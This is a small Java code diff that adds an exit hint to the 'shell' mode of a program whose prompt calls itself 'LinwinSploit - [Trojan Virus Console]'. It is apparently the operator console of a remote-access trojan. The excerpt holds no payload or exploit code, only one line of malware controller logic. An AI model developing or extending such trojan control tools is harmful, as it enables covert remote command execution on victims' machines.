@@ -53,6 +53,7 @@ public class Control {
                             continue;
                         }
                         if (send_command.equals("shell")) {
+                            System.out.println("Enter 'exit' to exit.");
                             terminal = "LinwinSploit - [Trojan Virus Console] (Shell) > ";
                             System.out.print(terminal);
                             while (true) {
